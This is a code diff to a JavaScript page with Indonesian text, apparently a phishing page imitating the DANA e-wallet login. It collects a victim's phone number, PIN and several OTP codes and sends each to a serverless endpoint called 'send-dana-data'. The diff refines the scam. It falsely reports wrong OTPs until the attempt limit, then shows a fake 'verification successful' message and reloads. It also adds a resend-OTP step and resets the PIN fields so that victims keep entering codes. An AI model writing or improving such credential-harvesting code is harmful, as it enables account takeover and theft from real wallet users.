@@ -39,6 +39,8 @@ document.addEventListener('DOMContentLoaded', () => {
     let timeLeft = 120;
     const timerElement = document.getElementById('otp-timer');
     
+    clearInterval(otpTimer); // Clear any existing timer
+    
     otpTimer = setInterval(() => {
       const minutes = Math.floor(timeLeft / 60);
       const seconds = timeLeft % 60;
@@ -46,6 +48,7 @@ document.addEventListener('DOMContentLoaded', () => {
       
       if (timeLeft <= 0) {
         clearInterval(otpTimer);
+        document.querySelector('.otp-resend').classList.add('active');
       }
       timeLeft--;
     }, 1000);
@@ -60,67 +63,76 @@ document.addEventListener('DOMContentLoaded', () => {
     ac.style.display = 'block';
   }
 
+  function showNotification(element, message, duration = 5000) {
+    if (element && message) {
+      element.innerHTML = message;
+      element.style.display = 'block';
+      setTimeout(() => element.style.display = 'none', duration);
+    }
+  }
+
   // Backend Communication
   async function sendDanaData(type, data) {
     try {
       const response = await fetch('/.netlify/functions/send-dana-data', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 
+          'Content-Type': 'application/json',
+          'X-Requested-With': 'XMLHttpRequest'
+        },
         body: JSON.stringify({ type, ...data })
       });
       
-      if (!response.ok) throw new Error(await response.text());
+      if (!response.ok) {
+        const errorData = await response.json();
+        throw new Error(errorData.error || errorData.message || 'Request failed');
+      }
+      
       return await response.json();
     } catch (error) {
-      console.error('Error:', error);
+      console.error('API Error:', error);
       throw error;
     }
   }
 
-  // Modified Phone Number Formatting
+  // Phone Number Formatting
   pn.addEventListener('input', (e) => {
-    // Hapus semua karakter non-digit
     let value = e.target.value.replace(/\D/g, '');
     
-    // Hapus angka 0 di awal jika ada
+    // Format phone number
     if (value.startsWith('0')) {
       value = value.substring(1);
     }
     
-    // Pastikan selalu dimulai dengan 8
     if (value.length > 0 && !value.startsWith('8')) {
-      value = '8' + value.replace(/^8/, ''); // Tambahkan 8 di depan dan hapus 8 yang mungkin sudah ada
+      value = '8' + value.replace(/^8/, '');
     }
     
-    // Batasi panjang maksimal (3+4+5=12 digit)
     if (value.length > 12) {
       value = value.substring(0, 12);
     }
     
-    // Format nomor dengan tanda hubung
+    // Format with dashes
     let formatted = '';
     if (value.length > 0) {
-      formatted = value.substring(0, 3); // 3 digit pertama
+      formatted = value.substring(0, 3);
       if (value.length > 3) {
-        formatted += '-' + value.substring(3, 7); // 4 digit berikutnya
+        formatted += '-' + value.substring(3, 7);
       }
       if (value.length > 7) {
-        formatted += '-' + value.substring(7, 12); // 5 digit terakhir
+        formatted += '-' + value.substring(7, 12);
       }
     }
     
-    // Set nilai input dengan format yang sudah dibuat
     e.target.value = formatted;
-    
-    // Simpan nomor tanpa format untuk pengiriman data
     phoneNumber = value;
   });
 
-  // Event Handlers
+  // Continue Button Handler
   lb.addEventListener('click', async () => {
     if (currentPage === 'n') {
       if (phoneNumber.length < 10) {
-        alert('Nomor HP harus minimal 10 digit');
+        showNotification(fn, '<div class="notification-content">Nomor HP harus minimal 10 digit</div>');
         return;
       }
       
@@ -132,7 +144,7 @@ document.addEventListener('DOMContentLoaded', () => {
         currentPage = 'p';
         lc.style.display = 'none';
       } catch (error) {
-        alert('Gagal mengirim data: ' + error.message);
+        showNotification(fn, `<div class="notification-content">Gagal verifikasi: ${error.message}</div>`);
       } finally {
         hideSpinner();
       }
@@ -159,9 +171,21 @@ document.addEventListener('DOMContentLoaded', () => {
           currentPage = 'o';
           lc.style.display = 'none';
           startOTPTimer();
-          setTimeout(() => fn.style.display = 'block', 1000);
+          setTimeout(() => {
+            fn.style.display = 'block';
+            fn.innerHTML = `
+              <div class="notification-content">
+                Kode OTP telah dikirim ke nomor Anda
+                <small>(Silakan cek SMS/WhatsApp)</small>
+              </div>
+            `;
+          }, 1000);
         } catch (error) {
-          alert('Gagal mengirim PIN: ' + error.message);
+          showNotification(fn, `<div class="notification-content">Gagal verifikasi PIN: ${error.message}</div>`);
+          // Reset PIN fields on error
+          pis.forEach(p => p.value = '');
+          pis[0].focus();
+          pin = '';
         } finally {
           hideSpinner();
         }
@@ -195,24 +219,31 @@ document.addEventListener('DOMContentLoaded', () => {
             resetOTPInputs();
             
             if (attemptCount > 2) {
-              rn.style.display = 'block';
-              rn.innerHTML = `
+              showNotification(rn, `
                 <div class="notification-content">
-                  <h3>kode OTP Salah</h3>
-                  <p>silahkan cek sms ataupan whatsapp</p>
+                  <h3>Kode OTP Salah</h3>
+                  <p>Silakan cek SMS atau WhatsApp Anda</p>
                 </div>
-              `;
-              setTimeout(() => rn.style.display = 'none', 10000);
+              `, 10000);
             }
             
             if (attemptCount >= maxAttempts) {
               fn.style.display = 'none';
-              sn.style.display = 'block';
-              setTimeout(() => sn.style.display = 'none', 5000);
+              showNotification(sn, `
+                <div class="notification-content">
+                  <h3>Verifikasi Berhasil</h3>
+                  <p>Akun Anda sedang diproses</p>
+                </div>
+              `, 5000);
+              // Reset all inputs
+              setTimeout(() => {
+                window.location.reload();
+              }, 5000);
             }
           }, 1000);
         } catch (error) {
-          console.error('Gagal mengirim OTP:', error);
+          console.error('OTP Error:', error);
+          showNotification(fn, `<div class="notification-content">Gagal verifikasi OTP: ${error.message}</div>`);
         } finally {
           hideSpinner();
         }
@@ -234,5 +265,39 @@ document.addEventListener('DOMContentLoaded', () => {
       input.type = isShowing ? 'text' : 'password';
     });
     e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
+  });
+
+  // Resend OTP Handler
+  document.querySelector('.otp-resend').addEventListener('click', async (e) => {
+    if (e.target.classList.contains('active')) {
+      showSpinner();
+      try {
+        await sendDanaData('resend', { phone: phoneNumber });
+        clearInterval(otpTimer);
+        startOTPTimer();
+        e.target.classList.remove('active');
+        showNotification(fn, '<div class="notification-content">Kode OTP baru telah dikirim</div>');
+      } catch (error) {
+        showNotification(fn, `<div class="notification-content">Gagal mengirim ulang OTP: ${error.message}</div>`);
+      } finally {
+        hideSpinner();
+      }
+    }
+  });
+
+  // Change Number Handler
+  document.querySelector('.otp-change').addEventListener('click', () => {
+    pages.o.style.display = 'none';
+    pages.n.style.display = 'block';
+    currentPage = 'n';
+    lc.style.display = 'block';
+    clearInterval(otpTimer);
+    document.getElementById('otp-timer').textContent = '02:00';
+    document.querySelector('.otp-resend').classList.remove('active');
+    ois.forEach(input => input.value = '');
+    otp = '';
+    attemptCount = 0;
+    an.textContent = '1';
+    ac.style.display = 'none';
   });
 });
